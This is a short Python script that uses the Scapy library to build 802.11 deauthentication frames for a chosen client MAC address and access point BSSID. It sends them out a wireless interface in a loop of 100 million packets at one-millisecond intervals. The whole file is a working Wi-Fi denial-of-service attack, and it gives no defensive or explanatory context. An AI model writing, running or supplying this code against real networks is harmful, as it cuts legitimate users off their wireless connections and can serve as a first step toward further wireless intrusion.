from scapy.all import sendp
from scapy.layers.dot11 import Dot11Deauth, RadioTap, Dot11


def DeAuthLoop(interface, brdMac, BSSID):
    
   
    pkt = RadioTap() / Dot11(addr1=brdMac, addr2=BSSID, addr3=BSSID) / Dot11Deauth()
    sendp(pkt, iface=interface, count=100000000,
            inter=.001)  


def setTarget(brdMac, interface, BSSID):
   
    
    DeAuthLoop(interface, brdMac, BSSID)

    return